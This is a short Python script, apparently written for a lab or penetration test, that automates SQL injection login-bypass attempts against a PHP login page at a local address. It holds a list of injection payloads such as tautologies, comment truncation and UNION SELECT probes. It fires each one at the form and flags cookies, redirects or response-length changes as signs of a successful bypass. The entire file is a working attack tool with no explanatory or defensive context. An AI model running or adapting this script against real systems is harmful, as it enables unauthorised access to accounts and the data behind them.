import requests

# Target URL
target_url = "http://127.0.0.1:33167/login.php"

# Payloads to test
payloads = [
    "admin' OR '1'='1'--",
    "admin'--",
    "admin'#",
    "admin'/*",
    "' OR 1=1--",
    "' OR '1'='1",
    "admin' AND '1'='1'--",
    "admin' AND '1'='2'--",
    "admin' UNION SELECT 1,2,3--",
    "admin' UNION SELECT null,null--"
]

try:
    # Create session
    session = requests.Session()
    
    # Baseline test with admin/admin
    print(f"[*] Baseline test: admin/admin")
    baseline_data = {'username': 'admin', 'password': 'admin'}
    baseline_response = session.post(target_url, data=baseline_data, allow_redirects=False)
    baseline_length = len(baseline_response.content)
    print(f"[BASELINE] admin/admin | {baseline_response.status_code} | {baseline_length}B\n")
    
    # Reset session for payload tests
    session = requests.Session()
    
    # Test each payload
    print(f"[*] Testing SQL injection payloads...\n")
    print(f"{'Payload':<40} | Status | Cookie | Length")
    print("-" * 80)
    
    for payload in payloads:
        try:
            # Send POST request with payload
            data = {'username': payload, 'password': 'dummy'}
            response = session.post(target_url, data=data, allow_redirects=False)
            
            # Check for PHPSESSID cookie
            has_cookie = 'PHPSESSID' in response.cookies
            response_length = len(response.content)
            
            # Print results
            print(f"{payload:<40} | {response.status_code:>6} | {str(has_cookie):>6} | {response_length:>6}B")
            
            # Highlight if success indicators detected
            if has_cookie or 300 <= response.status_code < 400 or response_length != baseline_length:
                print(f"[!] POTENTIAL SUCCESS - Cookie: {has_cookie}, Redirect: {300 <= response.status_code < 400}, Length diff: {response_length != baseline_length}")
                print(f"[!] Response preview: {response.text[:200]}...")
                print("-" * 80)
            
        except Exception as e:
            print(f"[ERROR] Payload failed: {payload} | Error: {str(e)}")
            
except Exception as e:
    print(f"[CRITICAL ERROR] {str(e)}")


